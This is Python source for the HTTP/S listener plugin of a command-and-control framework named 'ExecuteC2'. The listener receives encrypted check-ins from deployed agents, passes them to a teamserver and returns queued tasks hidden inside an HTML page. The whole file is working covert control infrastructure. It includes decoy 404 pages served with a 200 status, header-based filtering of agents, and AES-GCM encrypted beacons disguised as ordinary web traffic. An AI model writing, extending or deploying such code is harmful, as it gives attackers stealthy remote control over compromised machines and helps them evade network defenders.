"""HTTP/S listener plugin for ExecuteC2."""

import asyncio
import base64
import logging
import os
from typing import TYPE_CHECKING

import msgpack
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

from executec2.listeners.base import ListenerPlugin

if TYPE_CHECKING:
    from executec2.server.teamserver import TeamserverInterface

logger = logging.getLogger(__name__)

_DEFAULT_PAGE_ERROR = "<html><body>404 Not Found</body></html>"
_DEFAULT_PAGE_PAYLOAD = "<html><body><<<PAYLOAD_DATA>>></body></html>"
_PAYLOAD_MARKER = b"<<<PAYLOAD_DATA>>>"


def _hkdf_derive(master_key: bytes, salt: bytes, info: bytes) -> bytes:
    hkdf = HKDF(algorithm=SHA256(), length=32, salt=salt, info=info)
    return hkdf.derive(master_key)


def _aes_encrypt(key: bytes, plaintext: bytes) -> bytes:
    nonce = os.urandom(12)
    return nonce + AESGCM(key).encrypt(nonce, plaintext, None)


def _aes_decrypt(key: bytes, data: bytes) -> bytes:
    return AESGCM(key).decrypt(data[:12], data[12:], None)


class HTTPListener(ListenerPlugin):
    """HTTP/S listener for Python agent check-ins."""

    def __init__(self):
        self.server: asyncio.Server | None = None
        self.teamserver: TeamserverInterface | None = None
        self.config: dict | None = None
        self._master_key: bytes | None = None
        self._beat_key: bytes | None = None
        self.paused: bool = False

    def get_info(self) -> dict:
        return {"name": "HTTPListener", "type": "http", "protocol": "HTTP/S"}

    def validate_config(self, config: dict) -> dict:
        required = ["port_bind", "callback_addresses", "encrypt_key", "uris", "beat_header"]
        for field in required:
            if field not in config:
                raise ValueError(f"Missing required field: {field}")
        key_hex = config["encrypt_key"]
        if len(key_hex) != 64:
            raise ValueError("encrypt_key must be 64 hex chars (32 bytes)")
        try:
            bytes.fromhex(key_hex)
        except ValueError:
            raise ValueError("encrypt_key must be valid hex")
        if not config.get("uris"):
            raise ValueError("uris must be non-empty")
        if not config.get("callback_addresses"):
            raise ValueError("callback_addresses must be non-empty")
        config.setdefault("host_bind", "0.0.0.0")
        config.setdefault("ssl", False)
        config.setdefault("http_method", "POST")
        config.setdefault("user_agents", [])
        config.setdefault("host_headers", [])
        config.setdefault("request_headers", {})
        config.setdefault("response_headers", {})
        config.setdefault("trust_x_forwarded_for", False)
        config.setdefault("page_error", _DEFAULT_PAGE_ERROR)
        config.setdefault("page_payload", _DEFAULT_PAGE_PAYLOAD)
        return config

    async def start(self, config: dict, teamserver: "TeamserverInterface") -> None:
        self.config = self.validate_config(dict(config))
        self.teamserver = teamserver
        master_key = bytes.fromhex(self.config["encrypt_key"])
        self._master_key = master_key
        self._beat_key = _hkdf_derive(master_key, b"beat", b"beat-encryption")

        host = self.config["host_bind"]
        port = self.config["port_bind"]
        self.server = await asyncio.start_server(
            self._handle_connection, host, port
        )
        logger.info("HTTP listener started on %s:%d", host, port)

    async def stop(self) -> None:
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            self.server = None
            logger.info("HTTP listener stopped")

    async def pause(self) -> None:
        self.paused = True

    async def resume(self) -> None:
        self.paused = False

    async def _handle_connection(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        try:
            raw = await asyncio.wait_for(reader.read(65536), timeout=10.0)
            if not raw:
                return
            response = await self._process_http_request(raw)
            writer.write(response)
            await writer.drain()
        except Exception:
            logger.debug("HTTP listener connection error", exc_info=True)
        finally:
            writer.close()

    async def _process_http_request(self, raw: bytes) -> bytes:
        """Parse raw HTTP bytes, validate, route to teamserver, return response."""
        try:
            header_end = raw.find(b"\r\n\r\n")
            if header_end == -1:
                return self._error_response()

            header_section = raw[:header_end].decode("utf-8", errors="replace")
            lines = header_section.split("\r\n")
            request_line = lines[0]
            method, path, _ = request_line.split(" ", 2)
            path = path.split("?")[0]

            # Parse headers
            headers: dict[str, str] = {}
            for line in lines[1:]:
                if ": " in line:
                    k, v = line.split(": ", 1)
                    headers[k.lower()] = v

            # Validate URI
            if path not in self.config["uris"]:
                return self._error_response()

            # Validate Host header
            host_headers = self.config.get("host_headers", [])
            if host_headers and headers.get("host") not in host_headers:
                return self._error_response()

            # Validate User-Agent
            user_agents = self.config.get("user_agents", [])
            if user_agents and headers.get("user-agent") not in user_agents:
                return self._error_response()

            # Parse beat header
            beat_header_name = self.config["beat_header"].lower()
            beat_header_value = headers.get(beat_header_name)
            if not beat_header_value:
                return self._error_response()

            try:
                beat_raw = _aes_decrypt(self._beat_key, base64.b64decode(beat_header_value))
            except Exception:
                return self._error_response()

            # Beat header: [4-byte type length][type name][8-byte agent_id ASCII][beat_data]
            try:
                type_len = int.from_bytes(beat_raw[:4], "big")
                agent_type = beat_raw[4:4 + type_len].decode()
                agent_id = beat_raw[4 + type_len:4 + type_len + 8].decode()
                beat_data_raw = beat_raw[4 + type_len + 8:]
                beat_data = msgpack.unpackb(beat_data_raw)
            except Exception:
                return self._error_response()

            # Determine external IP
            if self.config.get("trust_x_forwarded_for"):
                external_ip = headers.get("x-forwarded-for", "").split(",")[0].strip()
            else:
                external_ip = ""

            # Route to teamserver
            if not self.paused:
                await self.teamserver.agent_checkin(
                    agent_id=agent_id,
                    agent_type=agent_type,
                    beat_data=beat_data,
                    external_ip=external_ip,
                    listener_name=self.config.get("listener_name", ""),
                )

                # Get pending tasks
                task_bytes_list = await self.teamserver.agent_get_pending_tasks(agent_id)
            else:
                task_bytes_list = []

            # Build response
            tasks_payload = msgpack.packb(task_bytes_list)
            session_key = await self.teamserver.get_session_key(agent_id)
            encrypted = _aes_encrypt(session_key, tasks_payload)
            payload_b64 = base64.b64encode(encrypted).decode()

            page = self.config["page_payload"].replace("<<<PAYLOAD_DATA>>>", payload_b64)
            return self._ok_response(page.encode())

        except Exception:
            logger.exception("Error processing HTTP request")
            return self._error_response()

    def _error_response(self) -> bytes:
        body = self.config["page_error"].encode() if self.config else b"<html>404</html>"
        resp_headers = []
        for k, v in (self.config or {}).get("response_headers", {}).items():
            resp_headers.append(f"{k}: {v}")
        headers_str = "\r\n".join(resp_headers)
        if headers_str:
            headers_str += "\r\n"
        return (
            f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(body)}\r\n"
            f"{headers_str}\r\n"
        ).encode() + body

    def _ok_response(self, body: bytes) -> bytes:
        resp_headers = []
        for k, v in (self.config or {}).get("response_headers", {}).items():
            resp_headers.append(f"{k}: {v}")
        headers_str = "\r\n".join(resp_headers)
        if headers_str:
            headers_str += "\r\n"
        return (
            f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(body)}\r\n"
            f"{headers_str}\r\n"
        ).encode() + body
